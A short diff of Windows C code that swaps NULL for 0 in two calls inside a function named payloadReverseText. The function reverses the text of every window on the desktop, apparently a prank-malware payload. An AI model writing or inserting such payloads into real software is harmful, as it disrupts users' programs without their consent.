@@ -5,7 +5,7 @@ BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
 PAYLOADFUNCTIONDEFAULT(payloadReverseText) {
 	PAYLOADHEAD
 
-	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
+	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, 0);
 
 	out: return 50;
 }
@@ -15,7 +15,7 @@ BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
 
 	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
 		strReverseW(str);
-		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
+		SendMessageTimeoutW(hwnd, WM_SETTEXT, 0, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
 	}
 	
 	GlobalFree(str);
